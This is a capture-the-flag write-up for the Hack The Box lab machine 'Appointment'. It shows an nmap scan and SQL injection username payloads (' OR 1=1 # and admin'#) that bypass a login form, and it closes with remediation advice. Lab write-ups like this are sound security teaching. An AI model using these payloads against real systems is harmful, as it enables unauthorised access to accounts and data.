# Appointment

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 0

**Summary:** The login form was vulnerable to SQL injection, which allowed a full authentication bypass. The flag was behind the login.

## 1. Reconnaissance

- **Command:** `nmap -sC -sV 10.129.16.130`
- **Open ports:**

| **Port** | **Service** | **Version**  | **State** |
| -------- | ----------- | ------------ | --------- |
| 80       | HTTP        | Apache httpd | Open      |

- **Stack:** PHP / Apache
- **Key finding:** an exposed web app with a login form.

## 2. Foothold

The login doesn't sanitize input, so a basic SQLi works.

```
Username: ' OR 1=1 #
Password: anything
Result:   logged in without valid credentials
```

Alternative, targeting the admin account:
```
Username: admin'#
Result:   logged in; the # comments out the rest of the query, including the password check
```

## 3. Privilege Escalation

Not applicable: the flag is shown after logging in.

## 4. Conclusion

**Severity:** High

**Chain:** unsanitized login input → SQL injection → authentication bypass.

**Remediation:**
1. Use prepared statements instead of concatenating strings into SQL queries.
2. Secure defaults: disable anonymous logins where possible and apply least privilege.
